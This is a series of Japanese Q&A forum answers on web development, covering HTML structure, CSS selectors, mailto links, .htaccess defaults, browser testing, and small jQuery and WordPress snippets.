＞.redbuttonや.blacbuttonとcss(CSS)で指定したときに. 　CSSで、クラスセレクタを指定すると言う事は、単に対象とする要素を指定することで、動作とは関係ないです。 　HTMLやCSSを一度基礎からきちんと、それも正しく学びなおされることを強く薦めます。以下のリンク先だけでも読んで理解しておくこと。 　　(下記にいくつかの用語は説明しておく) 　スタイルシートを用いるという事は ・構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 ) 　をするためです。 　　HTMLには文書構造だけを記述し、CSSはその表現方法--プレゼンテーションを指定する 　★デザインのために.redbuttonや.blacbuttonのようなclass名をつけるのではない!! 　<h1>ここは見出し</h1><p>ここから一つの段落で、<strong>ここは重要</strong></p> 　それだけでは文書構造を示しきれないので ・「id属性及び class属性と併用することで、文書に構造を付加する( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )」 　<div class="nav">ここからナビゲーション</div>、<div class="section">ここは本文</div> 　そのうえで、スタイルシートは、その文書構造に基づいてセレクタで要素を指定してデザインする。 [例] 　本文の段落内の文字は紺色で、重要な語句は赤字で・・ 　div.section p{color:navy;} 　div.section p strong{color:red;} ＞.redbuttonにマウスカーソルが重なると白に、もう一つのblacbuttonにマウスカーソルが重なると赤にのように個別に指定する方法がありましたら 　ここまで理解できたら、この質問が成り立たない事が分かると思います。 ・クラスセレクタは、個別に指定する一意セレクタ(id)とは違う ・クラスにしろidにしろ他のセレクタにしろ、特定の要素を指定する方法はセレクタで行なう。 ★言い換えるとclass名やidに関わらず、セレクタで要素を特定できれば、「マウスカーソルが重なると白に、もう一つのblacbuttonにマウスカーソルが重なると赤に」にとどまらず、スタイルシートで可能な事はなんでもできます。 [用語] ・HTML(Hyper Text Markup Language)は、文書を構成する要素(部品)をタグでマークアップする言語。<p>ここから一つの段落・・・</p>はこのテキストが一つの段落(Paragraph)要素であることを示しています。「ここから一つの段落・・・」はその要素の内容という。 ・セレクタ(選択子)は、そのHTML内の特定の要素を指定する方法。div.section p{}とはclass名にsectionをもつdiv要素の子孫(半角スペース)であるp要素と言う意味。 　これはスタイルシートで絶対に必要な知識。しっかり身につけておきましょう。 　5 セレクタ( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/selector.html ) 　6 プロパティ値とカスケーディング、継承の割り当て( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/cascade.html ) p:hover{color:red;} p+p:hover{color:green;} p+p:hover+p{background-color:black;color:red;} 段落はカソールが載ると赤文字 二つ目以降の段落は緑色の字 その次の段落は背景黒で文字は白 　
こんにちわ。 tracer様が仰っているようにサイト作成には様々な方法がありますので、色々調べて自分の目的に合うものを探されると良いかと思います。 勉強しなければならない事はたくさんありますので、頑張ってください！ 【例】 言語 php,ruby等のプログラミング言語　+ javascript + html DB mysql,PostgreSQL,mariaDB etc webサーバー apache,nginx etc ただ、1点Yahooやgoogleの検索のような機能を作られたいのでしたら、加えて検索エンジンについても学ばれた方が良いかと思います。 有名なものをあげますと以下の二つかなと思います。 ・Solr ・elasticsearch
高機能なものを作るならば、サンプルサイトのようにJavaScriptを使ってできますが、表示を切り替えるだけならCSSだけでできます。たとえばCSSだけでつくるSlideShowを参考にしてみると分かりやすいと思います。単にCSSで表示のON/OFFを切り替えるだけですから。
一見してShift_JISからLatin-1(別名: Windows1252、ISO-8859-1、西欧)への文字化けとわかりますが、 文字コードを変えても読めないというところからするに、 「文字化けした文字列を別の文字コードで保存してしまった」状況と考えられます。 こうなると完全な復元は不可能です。 部分的な復元でよければ、その文字列をコピーし、保存時に文字コードが選べるテキストエディタでLatin-1として保存し、そのファイルをShift_JISで開けば読めるでしょう。 例えばお示しの文は 「いつまでこのペ?[ジが続くの?H?@なんて思ってた・なたの」 と復元できます。
仕様書に厳格に書くと <table summary="時間割" border="1"><!-- table(綴り) summaryは必須 borderは後方互換 --> 　<tbody><!-- 原則必須、一つしかないときは省略可能 --> 　　<tr> 　　　<th abbr="1限">一時限目</th><!-- thにはabbr必須 --> 　　　<td>国語</td> 　　</tr> ・・・原因は <tabele>× <table> 　　
HTMLの仕様上、inputタグのname属性は大文字小文字を識別しない事になっているので、基本的には無理だと思います。
　異なろうが、同じ種類だろうが、リストの項目なら<li></li>でマークアップすればよいだけです。 　そのマークアップが否かは、著者であるあなたしか分からない。 10 リスト( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/lists.html ) たとえば、日本の山の一覧をリストとしてマークアップしたいなら <ol> 　<li>富士山 　　<ul> 　　　<li><img src="" width="" height="" alt=""></li> 　　　<li>緒元 　　　　<ul> 　　　　　<li>標高:</li> 　　　　　<li>緯度経度:</li> 　　　　　<li>県</li> 　　　</li> 　　　<li>日本を代表する山で火山である。</li> 　　</ul> 　</li> ・・・とリストとしてマークアップすることもあるでしょう。 ＞異なったコンテンツごとに<ul>か<div>など使うべきなのでしょうか? 　これは根本的な部分でHTML/CSSを誤解されています。 　HTMLは、<h1>ここは見出し(heading)</h1><p>ここから、ここまでは一つの段落(paragraph)です。</p>　<blockquote>ここは引用</blockquote>と・・。あくまで文書構造をマークアップするのがHTMLです。 　そして、それをどのように表現するかがスタイルシートの役割です。何も指定しなければ、ブラウザが持つデフォルトのスタイルシートで表示されます。←ここを誤解されている人が多い。 　「異なったコンテンツ」という考え方ではなく、文章だろうが画像だろうが複数の項目からなるリスト的な項目ならリストでマークアップすることがあるでしょう。要はそのコンテンツがリストの項目(List Item)であるか否かだけが重要なのです。 　もう一点!!、DIVはHTMLで用意されている要素では文書構造が表せない時に!! 『id属性及び class属性と併用することで、文書に構造を付加するため( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )』のものです。 　例えば、 <div class="header"> 　ここはこの記事のヘッダ部分 　<div class="nav"> 　　ここはナビゲーション 　</div> </div> <div class="section"> 　ここからは、この記事の主題である本文 </div> 　と言う風に使えということ!! 　ちなみにこれは理解できない人が多く、その反省から「文書をよりよく構造化するために、次の要素が新しく追加されました。( http://standards.mitsue.co.jp/resources/w3c/TR/html5-diff/#new-elements )」し、DIVは安易に使えなくなります。 　HTMLとスタイルシートは使い分けること 構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 ) ＞異なったコンテンツごとに<ul>か<div>など使うべきなのでしょうか? 　答えはお分かりだと思います。コンテンツで決まるのではなく、その文書の中でのコンテンツの「立ち位置」によって判断されるべきです。 　
文法的なことはさておいて、気になる点が2つ。 1. liとhoverの間の:(コロン)の両端に余分な半角スペースがありますが、コピペしたとしたら、これでは動作しません。 .main li : hover .sub{ visibility:visible; } 2.display:noneではなく、visivility:hiddenにするのはなぜでしょう。 html/cssに慣れていない方全般に言えることですが、ブラウザには標準で強力な開発ツールがついています。開発ツールの使い方を覚えれば、今回のレベルの質問はほぼなくなると思います。
.htaccessファイルは存在しますか？　無ければ作れば良いかと思います。 サイトの設定で、ファイル名のないURLでページが呼び出された際に どのファイルをユーザに送信するかを指定しています。 その指定が通常はindex.htmlあるいはindex.htmだけということです。 その指定を特定のフォルダ以下で自分ルールに上書きするのが.htaccessファイルです。 （先頭のドットを忘れないように） このファイルを置いておくと、そのフォルダ以下はこのファイルに書かれているルールで 上書きされ、ファイル名なしURLでページが呼び出された際にどのページを送信するかなどのルールを変更できます。 以下のページ「デフォルトのファイルを変更する」が詳細です。 http://www.tagindex.com/other/htaccess.html もしウェブサーバをご自分で建てられたなどの理由でウェブサーバの設定そのものを操作できるのであれば そちらでデフォルトページを追加・変更するのも一つの手段です。
<input type="file"> ではなくてFileAPIでしょうか？ FileAPIが有効かどうかは以下のリンクにあるとおり if(window.File && window.FileReader) で確認できます。 http://tokidoki-web.com/2013/08/file-api%E3%81%A7%E3%83%AD%E3%83%BC%E3%82%AB%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E6%83%85%E5%A0%B1%E5%8F%96%E5%BE%97%E3%81%97%E3%81%A6%E3%82%84%E3%82%93%E3%82%88/ HTML５の各項目の対応はブラウザによってまちまちです。 一概には言えないですね。
1. 上メニュー よくわかりませんが 950px の場合なら非表示にしている サイドメニューを表示すればよいのではないでしょうか? 内容は同じでしょうから これを削除 @media screen and (max-width:950px){ #side { display: none; } } ただし * 760px 未満だとページ最下部に表示される * 760px 未満での #side li にスタイル定義が必要 2. コンセプト <!-- 段組を解除する場合 --> <style> div#content h3 { clear:both; } </style> <div id=content> _ <h2> ... へようこそ</h2> _ <div class=02_left> <h3>オススメ</h3> ... <h3>採用情報</h3> ... </div> _ <div class=02_right> <h3>新着情報</h3> ... </div> _ <h3>コンセプト</h3> _ <div class=box_out><div class=box_in>...</div></div> _ <div class=to_top> ... </div> </div> <!-- 段組内に入れる場合 --> <div id=content> _ <h2> ... へようこそ</h2> _ <div class=02_left> _ _ <h3>オススメ</h3> ... _ _ <h3>採用情報</h3> ... _ _ <h3>コンセプト</h3> <div class=box_in>...</div> _ </div> _ <div class=02_right> <h3>新着情報</h3> ... </div> _ <div class=to_top> ... </div> </div>
IE Testerですか。もはや懐かしいですね。たしかに現在はまず使いませんね。実物を使わないなら互換モードで確認すれば十分ですしね。互換モード以上の確認をしたいのならVMでしょうね。「OSを用意するのが大変」という心配は要りません。IEのテスト用にマイクロソフトがOSごと無料で提供しています。 https://www.modern.ie/ja-jp IE6より古いものは提供していませんが、IE6以降のテスト用にVMのイメージがOSごと提供されています。 しかも、 ・Hyper-V用 ・Virtual PC用 ・VirtualBox用 ・VMware Player用 とそれぞれ用意されていますし、さらにMacでもLinuxでも構築できるよう提供されています。ものすごく親切です。OSのインストールが不要なため簡単に導入することができます。非常にお勧めです。 また、それすら面倒くさいという人のために以下のクラウドサービスもあります。 Cross Browser Testing Tool. 300+ Browsers, Mobile, Real IE. http://www.browserstack.com/ こちらを使うとクラウド上で各種OS・各種ブラウザ・各種バージョンのテストが非常に簡単にできます。しかしこちらは有料で、トライアルとして3ヶ月のみ無料で使えます。料金は一番安いBasicで「$ 99 /mo, 2 parallel tests」とのことです。個人だと高いですが、テストを日常的に行う会社なら安いと思います
まず、javaとjavascriptは名前は似てますが全くの別物ですのでご注意を。 element.styleはタグのstyle=""に直接書かれたスタイルです。 デモを見るとjquery.sticky.jsはposition:absolute;なタグを想定していないようです。 本来の使い方としては、ある要素が画面内にいるうちはなにもせず、 画面外に行った時には画面内に表示するために導入されるべきものかと思います。 今回の場合は、 #socialboxの position:absolute; を position:fixed; にすればいいだけのように思えます。
画像のサイズが決まっているのならCSSだけでも設定可能ですが、サイズが不特定だと、画像毎にIDかクラスを個別に設定する必要があります。 下記のサイトが詳しく説明されているので、参照ください。 参考： 「CSSだけで画像をトリミングする方法3つとjQueryを使う方法1つ」 http://cappee.net/coding/css-image-trimming jQueryを使えば、画像サイズが不特定でも可能なようです。 上記サイトにも紹介されています。 あとこちらも 「画像を範囲に合わせて縮尺を変え、トリミングと上下左右中央揃えをしてくれる「imgLiquid」」 http://nakazilab.com/img-liquid/
テンプレの文字コードがUTF-8なので、 上書き保存する時UTF-8で保存すれば良いと思います。
$("[name='test']").click(function(){ var num = $("[name='test']").index(this); if(num == 1){ $("#box").removeClass("box_l").addClass("box_r").removeAttr('style'); $("#tab").removeClass("tab_l").addClass("tab_r").removeAttr('style'); } else { $("#box").removeClass("box_r").addClass("box_l").removeAttr('style'); $("#tab").removeClass("tab_r").addClass("tab_l").removeAttr('style'); } }) とすればとりあえずうまく動くようです。 animateやcssであてたstyleがclassよりも優先されるのでそのような動作になるようです。 animationをcssだけで表現すればclassのaddとremoveでもっとかんたんに書けるはず。
＞<p id="#01">ここ</p> まさにここです。#は不要、それ以前に<a href></a>に対応するアンカーは<a name></a>です。
超泥臭いけどショートコードを使ったらどうだろう。 今使ってるテーマのfunctions.phpに、以下のような内容を追記。 ～～～～～～～～ function tokyo_code() { 　return '20'; } add_shortcode('tokyo', 'tokyo_code'); function hokkaido_code() { 　return '30'; } add_shotcode('hokkaido', 'hokkaido_code'); ～～～～～～～～ これでページBやページCの本文に ・東京の番号は[tokyo]です。 などと書けば、表示時に ・東京の番号は20です。 と変換される。 多分tokyoやhokkaidoというのは例であって実際はもっと多いのだと推測される。という事で連想配列にしてみよう。 ～～～～～～～～ function basho_code($attributes) { 　$bcodes = array( 　　'unknown' => '-1', 　　'tokyo' => '20', 　　'hokkaido' => '30', 　　'hiroshima' => '40' 　); 　extract(shortcode_atts(array('bcode' => 'unknown'), $attributes)); 　return $bcodes[$bcode]; } add_shortcode('basho', 'basho_code'); ～～～～～～～～ 使うほうは ・東京は[basho bcode="tokyo"]です。 という感じになる。 後はお好きなタイミングでfunctions.phpの中でコードの値を変えてやればいい。
＞文字をボックスで囲うことができるタグは？ 　とてもとても大事なところを誤解されている。今後の成長のためにぜひとも身につけておいてください。 　HTMLは文書構造、スタイルシートはそのプレゼンテーションを指定します。 『構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 )』 　と言われます。 　すなわち、 <p>今日は<a href="#hare">晴れ</a>です</p> 　とは、#Hareで示されているところにリンクするアンカーが、「今日は・・・す」という段落内にあるというマークアップです。どのように表示するかはHTMLにはまったく無関係です。 ★それが、段落の前後で改行され余白が取られ、a要素にアンダーラインが引かれも辞職が変わるのは、ブラウザがもつスタイルシートによるものです。 ★スクリーンリーダーだと、段落の前後で一呼吸置いて読まれたりするでしょう。 　<p></p>はブロック要素で、内部に行内要素しか置けません。 ブロックレベル要素と行内要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.3 ) <!ELEMENT P - O (%inline;)*( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/text.html#edef-P ) 　よって・・ フレーズ要素: EM、 STRONG、DFN、CODE、SAMP、 KBD、VAR、CITE、ABBR、及び ACRONYM要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/text.html#h-9.2.1 ) 　と、<a>要素、<span>が置けることになります。それぞれの使い道はリンク先を確認。 　spanは、他の要素では文書構造を表すのに不十分な時に『id属性及び class属性と併用することで、文書に構造を付加』するために使います。 　<span class="mark">ここは他所から参照されるかもむ・・</span> 　そのうえで、 em{ 　background-color:yellow; 　padding:0.5em 1em; 　font-style:normal;/* ブラウザのデフォルトは斜体なので */ } 　とかすればよい。基本的にはdisplay:inline-block;はここでは書かない。 display:inline-block;は、本来は行内要素でないブロック要素やリスト項目要素などを、行内ブロックにプレゼンテーションするときに使用する。 　
そもそも論になってしまうのですが……。 <meta http-equiv="refresh">タグは、ブラウザの設定によっては動かないことはご存じですか。例えばIEの場合、セキュリティレベルを「高」にすると動かないと思います。またページのリロードをOFFにしても動きません。 最近は、<meta http-equiv="refresh">で別サイトに飛ばす悪質なWebサイトが増えてきましたので、それへの対策で無効化する人は増えてきていると思います。<meta http-equiv="refresh">タグはサーバー側でリダイレクト設定できない場合のあくまで一時的な対処であり、動作はブラウザに委ねられています。 また、フレームで分割してページを設計するというやり方そのものも現在はあまり推奨されていないと思います。例えば検索エンジンでchatbody.phpに直接飛んできた人がいたらどうしようもありませんね？ チャットのようにリアルタイムにサーバーとデータをやりとりする場合、Ajaxを利用して定期的にサーバーと通信し表示を更新するのが一般的ではないかと思います。全体の設計を見なおしたほうがいいように思えます。
ホームページビルダーを使って。という方法ではありませんが、.htasccess という特別なファイルを作ってこれをサーバ上に設置することで、自動転送させることが可能です。 http://allabout.co.jp/gm/gc/23770/ 細かい文法などは少し難しいのですがこういうところを見て調べるとよいかと思います。 http://htaccess.cman.jp/
html タグの直下には head と body しか置けません。 https://developer.mozilla.org/ja/docs/Web/HTML/Element/html したがって、それ以外の script を置いてはいけません。 たとえそれでスクリプトが動いてしまっても、それはそのブラウザが気を利かせて大目に見ているだけで、他のブラウザでスクリプトが動く保証はありません。
HTMLのバージョンによって異なりますが、 リンク先をHTMLで特定して、そこにリンクする。 -------------------------- 特定する方法は <a name="Target1">ここ</a> <h1 id="Target2">ここ</a> のふたつの方法があります。 正確な情報は 　⇒12.1 リンクとアンカーの概説( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/links.html#h-12.1 ) 　　12.2.3 id属性によるアンカー( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/links.html#h-12.2.3 )
HGP創英角ポップ体は確かS-JISコードのフォントと思います。 文字コードをS-JISにすればいいと思います。
　tableは、「二次元以上のデータを表すもの」です。よって、列や行の変更はできません。あってはならない。 ★単に文書内容を整形する目的だけで表を用いるべきでない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#h-11.1 ) 　tableでないのでしたら、御随意に、変更してください。floatで回り込ませようと、mediaquery使おうと・・ 　利用するのはPCやスマホといったscreenメディアだけじゃない 『HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )』さらに検索エンジンも考慮しなければならない。 　印刷(media="print")、携帯電話(media="handheld")、読み上げブラウザ('aural''speech')とかも無視はできないです。 　
JavaScript で動作します。 ”スムーススクロール”で検索して、好きなスクリプトを使用するのがいいです。
書けます。 というか、書いたことあります。 とあるページで、「IE7以下の場合のみこのHTMLタグを読み込ませたい」という条件があったので。 下記にも同様の質問がありました。 「ブラウザを判別してIE6の時だけメッセージを流したい。」 http://wifi.yahoo.co.jp/oshiete-wifi/detail/1031479205 文法的にはコメントなので、記述される場所は<head>でも<body>でもいいが、コメント内に記述内容に合わせてどこに記述するか決めた方が良いとありますね。 また、IE10からは廃止されているので、IE9以下を対象とした内容に限られます。 参考「条件付きコメント」 http://ja.wikipedia.org/wiki/%E6%9D%A1%E4%BB%B6%E4%BB%98%E3%81%8D%E3%82%B3%E3%83%A1%E3%83%B3%E3%83%88
何を言いたいのか分かり難いので、もう少し見やすく分かり易く書くと良いですよ 簡潔にまとめると meta name="description" で「サイトの紹介文」を書いてもGoogleの検索結果で表示されません という事ですね それが普通だと思い気にしてませんでしたが、3サイト持っており確認したところ サイトA 紹介文が表示される サイトB RSSが表示される サイトB 人気記事の内容が表示される と表示のされ方に違いがありました。 Googleのサポートページで調べた所 https://support.google.com/webmasters/answer/35624?rd=1 『Google では、ページ上のコンテンツのみから得られる情報よりも正確な説明をユーザーに提供できると判断した場合、検索結果のスニペットにページのメタデータ（descriptions）を使用することがあります。』 何を表示するかはGoogleが勝手に決めます、文法が合っているかどうかは関係無いという事。 本文中に「紹介文」を表示したい時の作り方のコツが書かれているので読んでみると良いかも。
やはり,人気があるページが上位に出ます。 ですが,ヒットしないのは少しおかしいです。 グーグルのウェブマスターツールは使用してますか？ これを使っているとmetaで指定してなくても検索にヒットするようになります。 間違っていたらすみません。
というか、元々HTMLの最大の目的は!!! 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTML文書が、ブラウザやプラットフォームの違いを超えてうまく働くべきであるということは、多くが認めるところである。 相互運用性の達成は、コンテンツプロバイダのコストを低下させる。なぜならただ1種類の文書しか作る必要がなくなるからだ。 もし【相互運用性確保の】努力が成されなければ、Webは互換性のないフォーマット毎に分け隔てられた世界に分割され、すべての関係者にとっての商業的可能性が減少することとなるであろう、大きなリスクを負うこととなる 　・・・【中略】・・・ 　HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.2.1 )］より 　なのですからね。 ＞携帯用のページ、パソコン用のページと二つのページを作ればいいのでしょうか？ 　それをしないためのHTML/CSSなのです。 様々な解像度や色深度のグラフィックディスプレイを持つPC、スマホなど →　media="screen" 携帯電話、モバイル機器 →media="handheld 音声入出力機器 →media="speech" 印刷機 →media="print" さらに、それぞれ様々な解像度/サイズがある 　それに対してたった一つのHTMLで記述できるのがHTMLの最大の利点であり、そのためにHTMLを使ってウェブページを作成するのですよ。
質問) DOCTYPEスイッチはどう書かれていますか？？ ＞1行目は3等分にしたく、2行目は2等分にしたい形です。 　だと、2と3の公倍数のthとtdの倍、12等分して分けないと無理ですけど・・ ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html ) 　のDATAで検証済みの、HTML4.01strict + CSS2.1 ★IE7は、input要素へのスタイルが効かないが配置は同じになるはず <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} table[summary="form"]{ border-collapse:collapse; line-height:2em; } table[summary="form"] tbody tr th,table[summary="form"] tbody tr td{ border:solid 1px; position:relative; } table[summary="form"] tbody tr td input[type="text"]{margin:0;border:none;width:99%;} table[summary="form"] tbody tr td input:focus{background-color:yellow;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>本文はsection</p> ＿＿<table border="1" summary="form"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="Item1" width="80">項目1</th> ＿＿＿＿＿<td width="235"><input name="item1" type="text" value="12345"></td> ＿＿＿＿＿<th abbr="Item2" width="80">項目2</th> ＿＿＿＿＿<td colspan="3"><input name="item2" type="text" value="12345"></td> ＿＿＿＿＿<th abbr="Item3" width="80">項目3</th> ＿＿＿＿＿<td width="235"><input name="item3" type="text" value="12345"></td> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="Item4" width="80">項目4</th> ＿＿＿＿＿<td colspan="3"><input name="input2" type="text" value="12345"></td> ＿＿＿＿＿<th abbr="Item1" width="80">項目5</th> ＿＿＿＿＿<td colspan="3"><input name="input3" type="text" value="12345"></td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html> 　そんな無理なtabelではなくて、リストでマークアップしてスタイルシートで並べるほうが楽です。
<button type="button" onclick="window.open('http://www.yahoo.co.jp/','_blank');">新たなウインドウで開く</button>
IE8以下を区別するもの。 この場合、「￥」では無く「＼」の意味で使われます。 ※半角「￥」と半角「＼」は同じ文字コード。 「CSSハック」で検索すれば色々出てくるでしょう。
それを一時的に保管するのが「キャッシュ」です。 具体的な場所はOSやブラウザによって違いますのでブラウザの設定で確認してください。
No.2 の補足に対して 属性 required を使っているので、HTML5 で回答します アレ = ある条件、の対象となるタグ コレ = 指定の項目、のタグ とすれば、 var form = document.forms[アレとコレを含むフォームのname] form.elements[アレのname].addEventListener('change', createHandler(条件を満たすアレのvalue, コレのname), false); なので、 var form = document.forms['form01'] form.elements['jyoukyou'].addEventListener('change', createHandler('対応済', 'syuuryoubi'), false); それはそうと 誤: <option value="..."/> ... </option> 正: <option value="..."> ... </option>
firebugではなく、右クリックでページのソースを表示させ、style.cssと書かれている場所を探します。見つかったら、そこをクリックすると、style.cssのソースの中身が表示されます。上から5行ぐらいにそのテーマに関する内容が書かれているハズです。
あくまでHTMLだけで作った場合の質問なのか悩んでしまいましたが、追記します。 > 私も最初は相対パスで記述しており、途中でルート相対パスに変更してみたのですが、ローカルでは正> しくリンクしない事に気が付きました。 現在作成されているものがHTMLだけで構成されるならば、環境によっては、ルート相対パスは向かないと思います。 確認されている通り、開発環境と本番環境で異なる為です。 具体的に言うと、開発環境にWebサーバを立てていない場合。 開発環境におけるルート相対パスは、Webサーバを立ててこそ意味があります。 XAMPPでもApache単体でもいいから、インストールした上でDocumentRoot配下で開発を行っていれば、恐らく支障ありませんよ。 その環境を作らないと、作ったソースを丸々本番サーバでアップロードできません。 そういう意味では相対パスは、パス指定を簡素化できればWebサーバいらずですね。 プログラムを走らせる為、どの道Webサーバを立てないと動かせないようなサイトなら、まぁどっちでも好みの問題で、という次元が少なからずあると思います。 どちらでも走りますので。 ルート相対パスも相対パスも、参照するパスがやたら長ったらしいと煩わしい。 ミラーサイトが作成されるという懸念については、クライアントに全ソースをダウンロードしている以上、防ぎようがありません。 簡単だろうが難しかろうが、サイトのコピーは不可能ではないと考えていいです。 つまり、考えるだけ無駄です。 コピーされるのが嫌ならそもそもネット上に公開しない、特定の人物やドメインにのみ許可するなどの対応となるでしょう。 考えるのは、コピーを防ぐ方法よりは、コピーされた後の対応になると思います。 しかしそれも、動的ページ(PHPやらJavaやら使って)なら、クライアントに見えるのは描画が完了したページだけですから、丸ごとクローンというわけにはいかないでしょうね。
そのままのHTMLでしたら単純に input[name="figure"]{position:relative;left:30px;top:-20px;margin-left:-20px;} ＞できれば、大きさも変えたいと考えています。 ★inputなどUI(ユーザーインターフェースに関わる部分はデザインを変えてはなりません。 HTMLが不正なので、ちゃんとマークアップすれば変わります。
プログラムって……何をおっしゃっているのかがわからないのですが。 >　ttp://www.ietf.org/rfc/rfc6068.txt >　のプログラムはどこにあるか分かりません・！？ 見ましたが、これは単にRFCの説明文です。mailtoというURIスキームはどういう働きをするものか、の説明です。プログラムのことなど何も書いてありませんが……。 何か勘違いされているんじゃないでしょうか。
貴方のブラウザでポップアップを禁止しているだけでしょう。 それともjavascriptを禁止されているか？ 　不調なのではなく、貴方がそう設定しているだけです。 　このようなナビゲーションは、ページを作成するときには作ってはなりませんね。
mailto schemeのbodyは，メールの最初のtext/plainパートであると決められています。 ref) http://www.ietf.org/rfc/rfc6068.txt > 2. Syntax of a 'mailto' URI (省略) > The special <hfname> "body" indicates that the associated <hfvalue> > is the body of the message. The "body" field value is intended to > contain the content for the first text/plain body part of the > message. text/plainなので，色などの装飾情報を含むことはできません。
URL の相対指定の一種で、 URL が使用されている場所と同じスキーム(プロトコル)が使用されます。 仕様にも明記されています RFC 3986 / 4.2. Relative Reference これを使うことのメリットとしては http と https の両方で表示できるページにて、 スクリプトや画像を取得する際のスキームを簡単に統一できる点です。 https のページから http のアクセスは、 セキュリティな観点からブラウザが警告を発するのですが、 使用するスキームを統一すればこの問題は発生しません。 よって、埋め込み型の URL は全てスキームを省略する様に推奨している会社もあります http://google-styleguide.googlecode.com/svn/trunk/htmlcssguide.xml?showone=Protocol#Protocol
<a href="mailto:user@dammy.com?cc=user@dammy.net&subject=アンケート&body=【氏名】%0D%0A【性別】">MAIL</a> でいいはずですけど、なぜご自分で確かめられる事なのに自分でなさらないんでしょうか。 html書いてIEなどで開いてクリックすればいいだけでしょうに。 あとmailtoはメーラーが起動するだけなのでメーラー側で送信先など削除されたら、そこには届きませんよ。
カーボンコピー(CC)や、ブラインドカーボンコピー(BCC)知りませんか？ 参考にされてるurlにも書かれていますけど。
HTMLにするか、XHTMLにするか・・ 　つい数年前までは、W3CもHTMLは4.01で終了し、今後はXHTMLに移行すると宣言し、 HTML4.01 　そのままXML構文にあわせた 　　XHTML1.0 strict、XHTML1.0 transitional、XHTML1.0 frameset 　そして、予告どおりstrict以外を廃止した 　　XHTML1.1 　そして、XHTML2.0の策定を進めていましたが、W3Cの方向性に反対するWHATWGが独自にHTML5の策定を進め始めた。世界はXHTMLを支持せず、HTML5に向かい始めた。そのためW3Cは前言を翻して、XHTML2.0の策定を中止して、一緒にHTML5に進み始めた。 詳しくは、 ★HTML5が持つ本当の意味 － ＠IT( http://www.atmarkit.co.jp/news/200801/25/html.html ) ---「難しい技術は広く使われない」---- 以下は、"HTML5“とか”アプリ開発入門（1）：Webの3つの問題を解決する「HTML5」とは何なのか (2/2) - ＠IT( http://www.atmarkit.co.jp/ait/articles/1008/30/news106_2.html )"より 【問題1】Webブラウザ間の互換性が低い 【問題2】文書内に埋め込まれた「意味」が不明確 　　これは、HTML4.01のときにすでに『DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.4 )』とされていたはずなのに無視されてきた。 【問題3】Webアプリの機能が制限されている その反省から、HTML5は作られてきました。 私が示したサンプルは、HTML5の新しい要素をclass名などに取り入れた形になっている。 　将来を考えると現状ではHTML5を念頭において、HTML4.01strictが一番簡単でしょう。 ＞１分単位なので1440個のＴＤになってしまいます。 　それでしたら、table、特にtdは使いません。tableの描画は時間がかかります。 <div class="schedule"> 　<h2>週間予定</h2> 　<dl> 　　<dt>月</th> 　　<dd> 　　　<span class="noneOrder S0630 H0230 E0900">101</span> 　　　<span class="ordered S0900 H0100 E1000">&nbsp;</span> 　　　<span class="noneOrder S1000 H0150 E1050">102</span> 　　　<span class="ordered S1050 H0300 